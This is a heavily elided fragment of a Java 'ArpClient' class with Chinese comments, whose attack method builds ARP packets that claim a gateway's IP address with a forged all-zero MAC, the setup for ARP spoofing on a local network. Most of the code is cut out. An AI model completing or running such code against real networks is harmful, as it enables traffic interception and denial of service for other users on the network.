...
public class ArpClient {
     ...
     * 本地IP接收ARP包
     */
    private static final String LOCAL_HOST_IP = "10.122.246.30";
    ...
    private static void attack(String ip, int time) throws InterruptedException, IOException {
        ...
        byte[] srcmac = stomac("00-00-00-00-00-00");
        arp.sender_hardaddr = srcmac;
        //设置网关
        arp.sender_protoaddr = InetAddress.getByName("10.122.192.1").getAddress();
